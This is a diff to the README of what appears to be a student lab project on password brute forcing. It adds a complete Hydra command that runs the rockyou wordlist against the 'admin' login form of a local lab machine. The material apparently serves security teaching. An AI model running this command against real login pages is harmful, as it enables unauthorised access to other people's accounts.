@@ -18,3 +18,9 @@ https://gist.githubusercontent.com/techerbeatrice/8204e406ba94922aba76167b08c2c3
 
 
 ![image](https://github.com/techerbeatrice/brute_force_mot_de_passe/assets/138071140/419dbeba-f18e-4c21-9d4c-df2f7cbbadfb)
+
+_____
+
+Commande sur Hydra :    
+
+hydra  -l admin -P /usr/share/wordlists/rockyou.txt 192.168.56.104 http-post-form "/login:username=^USER^&password=^PASS^:F=Mot de passe invalide" -V
